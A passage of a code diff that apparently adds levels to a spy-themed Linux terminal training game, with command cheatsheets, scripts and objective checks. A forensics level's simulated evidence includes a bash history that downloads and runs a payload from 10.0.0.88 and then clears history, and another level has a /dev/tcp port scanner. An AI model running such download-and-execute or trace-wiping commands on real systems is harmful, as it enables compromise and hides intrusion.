+  1. Always start with #!/bin/bash
+  2. Use meaningful variable names
+  3. Add comments for complex logic
+  4. Test scripts on non-critical data first
+
+"Automate once, execute many."
+`
+                },
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Examine existing scripts',
-                    hint: 'Try: ls scripts/',
-                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('scripts')
+                    task: 'RECON: Survey Available Scripts',
+                    hint: 'List scripts: ls scripts/',
+                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('scripts') &&
+                        output && (output.includes('recon') || output.includes('.sh'))
                 },
                 {
                     id: 2,
-                    task: 'Read the recon script',
-                    hint: 'Try: cat scripts/recon.sh',
-                    check: (cmd, state) => cmd.includes('cat') && cmd.includes('recon')
+                    task: 'INTEL: Examine Recon Script',
+                    hint: 'Read the script: cat scripts/recon.sh',
+                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('recon') &&
+                        output && output.includes('#!/bin/bash')
                 },
                 {
                     id: 3,
-                    task: 'Execute the recon script',
-                    hint: 'Try: bash scripts/recon.sh',
-                    check: (cmd, state) => (cmd.includes('bash') || cmd.includes('./')) && cmd.includes('recon')
+                    task: 'EXECUTE: Run Recon Script',
+                    hint: 'Execute: bash scripts/recon.sh',
+                    check: (cmd, state, output) => (cmd.includes('bash') || cmd.includes('./')) &&
+                        cmd.includes('recon') && output && output.includes('RECON')
                 },
                 {
                     id: 4,
-                    task: 'Run the backup script',
-                    hint: 'Try: bash scripts/backup.sh',
-                    check: (cmd, state) => (cmd.includes('bash') || cmd.includes('./')) && cmd.includes('backup')
+                    task: 'DEPLOY: Run Backup Protocol',
+                    hint: 'Execute: bash scripts/backup.sh',
+                    check: (cmd, state, output) => (cmd.includes('bash') || cmd.includes('./')) &&
+                        cmd.includes('backup') && output && output.includes('dead drop')
                 },
                 {
                     id: 5,
-                    task: 'Verify backup results',
-                    hint: 'Try: ls -la',
-                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-l')
+                    task: 'VERIFY: Confirm Backup Created',
+                    hint: 'Check results: ls -la',
+                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-l') &&
+                        output && output.includes('scripts')
                 },
             ],
 
@@ -1690,7 +2234,7 @@ PHOENIX     - EXTRACTED
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['intel', 'reports', 'logs', 'data', 'scripts', '.bash_history', '.config', '.notes']
+                    children: ['intel', 'reports', 'logs', 'data', 'scripts', '.bash_history', '.config', '.notes', '.text_processing_cheatsheet']
                 },
                 // === INTEL DIRECTORY ===
                 '/home/operator/intel': {
@@ -2064,6 +2608,53 @@ grep 403 access.log
 cut -d ' ' -f 1 access.log | sort | uniq -c
 cat ../reports/threat_brief.txt
 ls -la /home/operator/.config/`
+                },
+                '/home/operator/.text_processing_cheatsheet': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 1024,
+                    content: `TEXT PROCESSING - OPERATOR CHEATSHEET
+=======================================
+
+CUT - Extract columns/fields
+  cut -d ' ' -f 1 file      Field 1, space delimiter
+  cut -d ',' -f 2,3 file    Fields 2 and 3, comma delim
+  cut -c 1-10 file          Characters 1-10
+
+SORT - Order lines
+  sort file                 Alphabetical sort
+  sort -n file              Numeric sort
+  sort -r file              Reverse sort
+  sort -k2 file             Sort by column 2
+  sort -t ',' -k3 file      Sort by field 3, comma delim
+
+UNIQ - Deduplicate (requires sorted input)
+  uniq file                 Remove duplicates
+  uniq -c file              Count occurrences
+  uniq -d file              Show only duplicates
+  sort file | uniq -c       Common pattern
+
+AWK - Field processing
+  awk '{print $1}' file         First field
+  awk -F: '{print $1}' file     First field, colon delim
+  awk '{print $1, $3}' file     Multiple fields
+  awk '/pattern/' file          Filter lines
+
+SED - Stream editing
+  sed 's/old/new/' file         Replace first match
+  sed 's/old/new/g' file        Replace all matches
+  sed '/pattern/d' file         Delete matching lines
+  sed -n '1,10p' file           Print lines 1-10
+
+COMMON PIPELINES
+  cut -d ' ' -f 1 file | sort | uniq -c | sort -rn
+  grep pattern file | awk '{print $2}' | sort -u
+  sed 's/secret/[REDACTED]/g' file > sanitized.txt
+
+"Transform data. Extract intelligence."
+`
                 },
             },
 
@@ -2699,7 +3290,7 @@ $     End of line
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['intel', 'logs', 'reports', '.bash_history', '.network_cheatsheet']
+                    children: ['intel', 'logs', 'reports', 'scripts', '.bash_history', '.network_cheatsheet']
                 },
                 '/home/operator/intel': {
                     type: 'dir',
@@ -2815,6 +3406,42 @@ $     End of line
                     content: `Network Recon Reports
 Save your findings here:
 netstat -tuln > reports/ports.txt`
+                },
+                '/home/operator/scripts': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['netcheck.sh', 'portscan.sh']
+                },
+                '/home/operator/scripts/netcheck.sh': {
+                    type: 'file',
+                    perms: '-rwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 256,
+                    content: `#!/bin/bash
+# Network connectivity checker
+echo "=== NETWORK STATUS ==="
+ip addr | grep inet
+echo "=== GATEWAY ==="
+ip route | grep default
+echo "=== DNS ==="
+cat /etc/resolv.conf 2>/dev/null`
+                },
+                '/home/operator/scripts/portscan.sh': {
+                    type: 'file',
+                    perms: '-rwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 189,
+                    content: `#!/bin/bash
+# Quick port scanner
+TARGET=\${1:-10.0.0.5}
+echo "Scanning $TARGET..."
+for port in 22 80 443 3306 8080; do
+  timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "$port open"
+done`
                 },
                 '/home/operator/.bash_history': {
                     type: 'file',
@@ -2933,7 +3560,7 @@ ROUTING:
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['.bashrc', '.profile', '.bash_history', '.env_cheatsheet', 'scripts', 'config']
+                    children: ['.bashrc', '.profile', '.bash_history', '.env_cheatsheet', 'scripts', 'config', 'logs', 'intel', 'reports']
                 },
                 '/home/operator/.bashrc': {
                     type: 'file',
@@ -3053,6 +3680,110 @@ export OPERATION_NAME="Shadow Strike"
 export TARGET_NETWORK="10.0.0.0/24"
 export EXFIL_SERVER="192.168.100.1"
 export ENCRYPTION_KEY="[CLASSIFIED]"`
+                },
+                // === LOGS DIRECTORY ===
+                '/home/operator/logs': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['env.log', 'session.log']
+                },
+                '/home/operator/logs/env.log': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 312,
+                    content: `[2024-01-15 08:00] Environment initialized
+[2024-01-15 08:01] PATH extended: /opt/shadow-tools
+[2024-01-15 08:02] MISSION variable set: active
+[2024-01-15 08:05] Source: config/mission.env loaded
+[2024-01-15 08:10] OPERATION_NAME: Shadow Strike
+[2024-01-15 08:15] Session ready for operation`
+                },
+                '/home/operator/logs/session.log': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 245,
+                    content: `Session: operator@shadow
+Started: 2024-01-15 07:55:00
+Shell: /bin/bash
+Term: xterm-256color
+Environment loaded from: ~/.bashrc, ~/.profile
+Custom tools: /opt/shadow-tools`
+                },
+                // === INTEL DIRECTORY ===
+                '/home/operator/intel': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['briefing.txt', 'variables.md']
+                },
+                '/home/operator/intel/briefing.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 356,
+                    content: `=== MISSION BRIEFING ===
+OPERATION: Shadow Strike
+STATUS: Active
+
+Environment variables control mission parameters.
+Configure the following before operation:
+- MISSION: Set to 'active' when ready
+- PATH: Must include /opt/shadow-tools
+- TARGET_IP: Primary objective
+
+Review .bashrc for persistent configuration.
+Run 'env' to verify all variables are set.`
+                },
+                '/home/operator/intel/variables.md': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 420,
+                    content: `# Critical Variables Reference
+
+| Variable | Purpose | Value |
+|----------|---------|-------|
+| MISSION | Operation status | active |
+| TARGET_IP | Primary target | 10.0.0.5 |
+| EXFIL_SERVER | Data extraction | 192.168.100.1 |
+| LOG_DIR | Operation logs | /var/log/ops |
+
+## Notes
+- Always verify PATH includes shadow-tools
+- Source mission.env before operation
+- Check env output matches expected config`
+                },
+                // === REPORTS DIRECTORY ===
+                '/home/operator/reports': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['README.txt']
+                },
+                '/home/operator/reports/README.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 189,
+                    content: `# Reports Directory
+
+Save environment audits here:
+  env > reports/env_dump.txt
+  printenv | sort > reports/sorted_vars.txt
+  echo $PATH > reports/path.txt
+
+Use for mission verification before operations.`
                 },
             },
 
@@ -3408,7 +4139,7 @@ tmux                Modern terminal multiplexer`
                     perms: 'drwxr-xr-x',
                     owner: 'operator',
                     group: 'operator',
-                    children: ['mission_brief.txt', '.bash_history', '.investigation_cheatsheet']
+                    children: ['mission_brief.txt', 'tools', 'reports', '.bash_history', '.investigation_cheatsheet']
                 },
                 '/home/operator/mission_brief.txt': {
                     type: 'file',
@@ -3484,6 +4215,56 @@ REPORTING
 ─────────
 echo "Finding" >> report.txt   Append to report
 cat log | grep X > findings    Save filtered results`
+                },
+                '/home/operator/tools': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['analyze.sh', 'extractor.sh']
+                },
+                '/home/operator/tools/analyze.sh': {
+                    type: 'file',
+                    perms: '-rwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 234,
+                    content: `#!/bin/bash
+# Quick log analysis script
+echo "=== ACCESS LOG SUMMARY ==="
+echo "Total requests: $(wc -l < /evidence/access.log)"
+echo "POST requests: $(grep -c POST /evidence/access.log)"
+echo "Failed (401): $(grep -c 401 /evidence/access.log)"`
+                },
+                '/home/operator/tools/extractor.sh': {
+                    type: 'file',
+                    perms: '-rwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 189,
+                    content: `#!/bin/bash
+# IP extractor
+echo "=== UNIQUE IPs ==="
+cut -d ' ' -f 1 /evidence/access.log | sort | uniq -c | sort -rn`
+                },
+                '/home/operator/reports': {
+                    type: 'dir',
+                    perms: 'drwxr-xr-x',
+                    owner: 'operator',
+                    group: 'operator',
+                    children: ['README.txt']
+                },
+                '/home/operator/reports/README.txt': {
+                    type: 'file',
+                    perms: '-rw-r--r--',
+                    owner: 'operator',
+                    group: 'operator',
+                    size: 156,
+                    content: `# Investigation Reports
+
+Save your findings here:
+  grep "pattern" /evidence/log > reports/findings.txt
+  echo "Attacker: 10.0.0.88" >> reports/summary.txt`
                 },
                 '/evidence': {
                     type: 'dir',
@@ -3958,49 +4739,158 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/courier': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
-                    children: ['incoming', 'outgoing', 'staging', '.bashrc']
+                    children: ['incoming', 'outgoing', 'staging', 'logs', '.bash_history', '.archive_cheatsheet']
+                },
+                '/home/courier/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 256,
+                    content: `ls -la incoming/
+tar -tzf incoming/package_alpha.tar.gz
+tar -xzf archive.tar.gz -C /destination/
+tar -czf output.tar.gz source_dir/
+gzip -t file.tar.gz
+md5sum file.tar.gz`
+                },
+                '/home/courier/.archive_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 789,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          ARCHIVE OPERATIONS CHEATSHEET                        ║
+╚═══════════════════════════════════════════════════════════════╝
+
+TAR OPERATIONS
+──────────────
+tar -czf archive.tar.gz dir/    Create gzipped tarball
+tar -xzf archive.tar.gz         Extract gzipped tarball
+tar -tzf archive.tar.gz         List contents (don't extract)
+tar -xzf archive.tar.gz -C dir/ Extract to specific directory
+
+COMPRESSION
+───────────
+gzip file                       Compress file (replaces original)
+gunzip file.gz                  Decompress file
+gzip -t file.gz                 Test integrity
+gzip -l file.gz                 List compression info
+
+ZIP OPERATIONS
+─────────────
+zip -r archive.zip dir/         Create zip archive
+unzip archive.zip               Extract zip
+unzip -l archive.zip            List contents
+
+INTEGRITY CHECKS
+───────────────
+md5sum file                     Generate MD5 hash
+sha256sum file                  Generate SHA256 hash
+md5sum -c checksums.md5         Verify against checksum file`
                 },
                 '/home/courier/incoming': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
-                    children: ['package_alpha.tar.gz', 'package_beta.zip', 'encrypted_bundle.tar.gpg']
+                    children: ['package_alpha.tar.gz', 'package_beta.zip', 'encrypted_bundle.tar.gpg', 'README.txt']
                 },
                 '/home/courier/incoming/package_alpha.tar.gz': {
                     type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 2097152,
-                    content: '[COMPRESSED ARCHIVE - tar.gz format]'
+                    content: '[COMPRESSED ARCHIVE - tar.gz format]\nContents: intel_report.pdf, asset_photos/, communications.log'
                 },
                 '/home/courier/incoming/package_beta.zip': {
                     type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 1048576,
-                    content: '[COMPRESSED ARCHIVE - zip format]'
+                    content: '[COMPRESSED ARCHIVE - zip format]\nContents: surveillance_photos/, target_profiles.xlsx'
                 },
                 '/home/courier/incoming/encrypted_bundle.tar.gpg': {
                     type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 4194304,
-                    content: '[GPG ENCRYPTED ARCHIVE - Requires handler key]'
+                    content: '[GPG ENCRYPTED ARCHIVE - Requires handler key]\nPassword hint: Operation codename + year'
+                },
+                '/home/courier/incoming/README.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 312,
+                    content: 'DEAD DROP INSTRUCTIONS\n======================\n1. Verify packages with checksums\n2. Extract to staging area\n3. Repackage for exfiltration\n4. Leave no traces\n\nHandler codename: RAVEN\nDrop schedule: 0300 UTC daily'
                 },
                 '/home/courier/outgoing': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
-                    children: []
+                    children: ['checksums.md5']
+                },
+                '/home/courier/outgoing/checksums.md5': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 128,
+                    content: '# Outgoing package checksums\n# Generate with: md5sum file >> checksums.md5'
                 },
                 '/home/courier/staging': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
-                    children: ['manifest.txt']
+                    children: ['manifest.txt', 'priority.txt']
                 },
                 '/home/courier/staging/manifest.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 256,
-                    content: 'DEAD DROP MANIFEST\n==================\nPackage Alpha: SIGINT intercepts\nPackage Beta: Asset photographs\nEncrypted Bundle: HUMINT reports\n'
+                    content: 'DEAD DROP MANIFEST\n==================\nPackage Alpha: SIGINT intercepts\nPackage Beta: Asset photographs\nEncrypted Bundle: HUMINT reports\n\nPriority: ALPHA (extract first)\nHandler: RAVEN'
+                },
+                '/home/courier/staging/priority.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 178,
+                    content: 'EXTRACTION PRIORITY\n===================\n1. package_alpha.tar.gz - SIGINT (HIGH)\n2. package_beta.zip - PHOTOS (MEDIUM)\n3. encrypted_bundle - HUMINT (HANDLER ONLY)'
+                },
+                '/home/courier/logs': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
+                    children: ['transfer.log', 'activity.log']
+                },
+                '/home/courier/logs/transfer.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 456,
+                    content: '2024-01-15 03:00 RECV package_alpha.tar.gz from DROP_01\n2024-01-15 03:02 RECV package_beta.zip from DROP_02\n2024-01-15 03:05 RECV encrypted_bundle.tar.gpg from DROP_03\n2024-01-15 03:10 VERIFY all packages intact'
+                },
+                '/home/courier/logs/activity.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 234,
+                    content: 'Session started: 2024-01-15 03:00 UTC\nOperator: courier\nMission: DEAD DROP RETRIEVAL\nStatus: PACKAGES AWAITING PROCESSING'
                 },
                 '/var/dead-drops': {
                     type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                     children: ['drop_01', 'drop_02', 'drop_03']
                 },
+                '/var/dead-drops/drop_01': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
+                    children: ['status.txt']
+                },
+                '/var/dead-drops/drop_01/status.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
+                    content: 'DROP 01 STATUS: CLEARED\nLast pickup: 2024-01-15 03:00 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
+                },
+                '/var/dead-drops/drop_02': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
+                    children: ['status.txt']
+                },
+                '/var/dead-drops/drop_02/status.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
+                    content: 'DROP 02 STATUS: CLEARED\nLast pickup: 2024-01-15 03:02 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
+                },
+                '/var/dead-drops/drop_03': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
+                    children: ['status.txt']
+                },
+                '/var/dead-drops/drop_03/status.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
+                    content: 'DROP 03 STATUS: CLEARED\nLast pickup: 2024-01-15 03:05 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
+                },
             },
 
             objectives: [
-                { id: 1, task: 'LIST: Incoming Packages', hint: '$ ls -la incoming/', check: (cmd) => cmd.includes('ls') && cmd.includes('incoming') },
-                { id: 2, task: 'INSPECT: Archive Contents', hint: '$ tar -tzf incoming/package_alpha.tar.gz', check: (cmd) => cmd.includes('tar') && (cmd.includes('-t') || cmd.includes('--list')) },
-                { id: 3, task: 'EXTRACT: Intel Package', hint: '$ tar -xzf incoming/package_alpha.tar.gz -C staging/', check: (cmd) => cmd.includes('tar') && (cmd.includes('-x') || cmd.includes('--extract')) },
-                { id: 4, task: 'CREATE: Exfil Package', hint: '$ tar -czf outgoing/exfil.tar.gz staging/', check: (cmd) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('--create')) },
-                { id: 5, task: 'VERIFY: Package Integrity', hint: '$ gzip -t outgoing/exfil.tar.gz', check: (cmd) => (cmd.includes('gzip') && cmd.includes('-t')) || (cmd.includes('tar') && cmd.includes('-t')) || cmd.includes('md5sum') || cmd.includes('sha256sum') },
+                { id: 1, task: 'LIST: Incoming Packages', hint: '$ ls -la incoming/',
+                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('incoming') &&
+                         output && (output.includes('package_alpha') || output.includes('tar.gz')) },
+                { id: 2, task: 'INSPECT: Archive Contents', hint: '$ tar -tzf incoming/package_alpha.tar.gz',
+                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-t') || cmd.includes('--list')) &&
+                         output && (output.includes('intel') || output.includes('Contents')) },
+                { id: 3, task: 'EXTRACT: Intel Package', hint: '$ tar -xzf incoming/package_alpha.tar.gz -C staging/',
+                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-x') || cmd.includes('--extract')) &&
+                         output && (output.includes('Extracted') || output.includes('staging')) },
+                { id: 4, task: 'CREATE: Exfil Package', hint: '$ tar -czf outgoing/exfil.tar.gz staging/',
+                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('--create')) &&
+                         output && (output.includes('Created') || output.includes('outgoing')) },
+                { id: 5, task: 'VERIFY: Package Integrity', hint: '$ gzip -t outgoing/exfil.tar.gz',
+                  check: (cmd, state, output) => ((cmd.includes('gzip') && cmd.includes('-t')) || cmd.includes('md5sum') || cmd.includes('sha256sum')) &&
+                         output && (output.includes('OK') || output.includes('intact') || /[a-f0-9]{32}/.test(output)) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the handler's codename for this dead drop operation?",
+                acceptedAnswers: ["raven", "RAVEN", "handler raven"],
+                hint: "Check the manifest.txt or README.txt in the staging or incoming directories.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Handler not recognized. Review the drop documentation.",
+                correctAnswerMessage: "HANDLER RAVEN CONFIRMED. Exfiltration authorized."
+            },
 
             remoteHosts: null,
         },
@@ -4022,7 +4912,54 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/forensics': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
-                    children: ['cases', 'tools', 'reports', '.bashrc']
+                    children: ['cases', 'tools', 'reports', '.bash_history', '.forensics_cheatsheet']
+                },
+                '/home/forensics/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'forensics', group: 'forensics', size: 234,
+                    content: `df -h
+lsblk
+du -sh /mnt/evidence/*
+find /mnt/evidence -size +1M -type f
+grep -r "DELETED" /mnt/evidence/
+file disk.img`
+                },
+                '/home/forensics/.forensics_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 856,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║          DISK FORENSICS CHEATSHEET                            ║
+╚═══════════════════════════════════════════════════════════════╝
+
+DISK ANALYSIS
+─────────────
+df -h                           Show filesystem space usage
+lsblk                           List block devices
+fdisk -l                        Show partition tables
+blkid                           Show block device attributes
+
+SIZE ANALYSIS
+────────────
+du -sh /path                    Directory size (human readable)
+du -sh /path/*                  Size of each item in directory
+du -ah /path | sort -rh | head  Find largest files
+
+FILE HUNTING
+───────────
+find /path -size +1M            Files larger than 1MB
+find /path -size +100M          Files larger than 100MB
+find /path -type f -name "*.log" Find by extension
+find /path -mtime -7            Modified in last 7 days
+
+CONTENT SEARCH
+─────────────
+grep -r "pattern" /path         Recursive search
+grep -l "pattern" /path/*       List files containing pattern
+strings file.img | grep -i pass Extract strings, find passwords
+
+IMAGE ANALYSIS
+─────────────
+file image.img                  Identify file type
+xxd image.img | head            Hex dump first bytes
+mount -o loop image.img /mnt    Mount disk image`
                 },
                 '/home/forensics/cases': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
@@ -4030,23 +4967,59 @@ find / -mtime -1 -type f 2>/dev/null`
                 },
                 '/home/forensics/cases/case_2024_001': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
-                    children: ['disk.img', 'memory.dmp', 'notes.txt']
+                    children: ['disk.img', 'memory.dmp', 'notes.txt', 'chain_of_custody.txt']
                 },
                 '/home/forensics/cases/case_2024_001/disk.img': {
                     type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 1073741824,
-                    content: '[RAW DISK IMAGE - 1GB]'
+                    content: '[RAW DISK IMAGE - 1GB]\nAcquired: 2024-01-10 14:30 UTC\nMethod: dd if=/dev/sda of=disk.img\nHash: SHA256:a3f2b8c9d4e5f6...'
+                },
+                '/home/forensics/cases/case_2024_001/memory.dmp': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 4294967296,
+                    content: '[MEMORY DUMP - 4GB]\nAcquired during live response\nContains process memory, network connections'
                 },
                 '/home/forensics/cases/case_2024_001/notes.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 512,
-                    content: 'CASE 2024-001: Compromised Workstation\n=====================================\nSuspect: Unknown threat actor\nEvidence: Full disk image acquired\nObjective: Recover deleted files and timeline\n'
+                    content: 'CASE 2024-001: Compromised Workstation\n=====================================\nSuspect: Unknown threat actor\nEvidence: Full disk image acquired\nObjective: Recover deleted files and timeline\nCase Officer: SPECTER\n'
+                },
+                '/home/forensics/cases/case_2024_001/chain_of_custody.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 345,
+                    content: 'CHAIN OF CUSTODY\n================\n2024-01-10 14:30 - Image acquired by Field Agent FALCON\n2024-01-10 16:00 - Transferred to Evidence Lab\n2024-01-10 16:15 - Received by Analyst FORENSICS\n2024-01-10 16:30 - Mounted for analysis'
+                },
+                '/home/forensics/cases/case_2024_002': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
+                    children: ['usb.img', 'notes.txt']
+                },
+                '/home/forensics/cases/case_2024_002/usb.img': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 16106127360,
+                    content: '[USB DRIVE IMAGE - 16GB]\nSuspected exfiltration device'
+                },
+                '/home/forensics/cases/case_2024_002/notes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 289,
+                    content: 'CASE 2024-002: Insider Threat\n=============================\nSuspect: Former employee\nEvidence: USB drive found in desk\nObjective: Recover deleted documents'
                 },
                 '/home/forensics/tools': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
-                    children: ['recover.sh', 'timeline.py']
+                    children: ['recover.sh', 'timeline.py', 'hash_verify.sh']
+                },
+                '/home/forensics/tools/recover.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 256,
+                    content: '#!/bin/bash\n# File recovery script\necho "Scanning for deleted files..."\nfind /mnt/evidence -name "*.deleted" -o -name "*~"'
+                },
+                '/home/forensics/tools/timeline.py': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 512,
+                    content: '#!/usr/bin/env python3\n# Timeline generation tool\n# Usage: python timeline.py /mnt/evidence > timeline.csv'
+                },
+                '/home/forensics/tools/hash_verify.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 178,
+                    content: '#!/bin/bash\n# Verify evidence integrity\nsha256sum "$1"\necho "Compare with chain of custody hash"'
                 },
                 '/home/forensics/reports': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
-                    children: []
+                    children: ['template.txt']
+                },
+                '/home/forensics/reports/template.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 234,
+                    content: 'FORENSIC ANALYSIS REPORT\n========================\nCase Number: \nAnalyst: \nDate: \nEvidence Hash: \nFindings:\n\nConclusion:\n'
                 },
                 '/mnt': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
@@ -4056,15 +5029,83 @@ find / -mtime -1 -type f 2>/dev/null`
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                     children: ['home', 'var', 'tmp']
                 },
+                '/mnt/evidence/home': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
+                    children: ['suspect']
+                },
+                '/mnt/evidence/home/suspect': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
+                    children: ['.bash_history', 'Documents', 'Downloads']
+                },
+                '/mnt/evidence/home/suspect/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'root', group: 'forensics', size: 456,
+                    content: 'curl -o /tmp/payload.sh http://10.0.0.88/mal.sh\nchmod +x /tmp/payload.sh\n/tmp/payload.sh\nrm -rf /tmp/payload.sh\nhistory -c'
+                },
+                '/mnt/evidence/home/suspect/Documents': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
+                    children: ['DELETED_confidential.docx', 'meeting_notes.txt']
+                },
+                '/mnt/evidence/home/suspect/Documents/DELETED_confidential.docx': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'forensics', size: 524288,
+                    content: '[DELETED FILE RECOVERED]\nClassified project documentation\nMarked for exfiltration'
+                },
+                '/mnt/evidence/home/suspect/Documents/meeting_notes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'forensics', size: 234,
+                    content: 'Meeting with handler: 2024-01-08\nDrop location: parking garage B3\nPayment: Bitcoin wallet provided'
+                },
+                '/mnt/evidence/var': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
+                    children: ['log']
+                },
+                '/mnt/evidence/var/log': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
+                    children: ['auth.log', 'syslog']
+                },
+                '/mnt/evidence/var/log/auth.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'forensics', size: 2048,
+                    content: 'Jan 8 02:15:00 workstation sshd: Accepted password for suspect from 10.0.0.88\nJan 8 02:15:30 workstation sudo: suspect : TTY=pts/0 ; COMMAND=/bin/bash'
+                },
+                '/mnt/evidence/tmp': {
+                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'forensics',
+                    children: ['.hidden_cache']
+                },
+                '/mnt/evidence/tmp/.hidden_cache': {
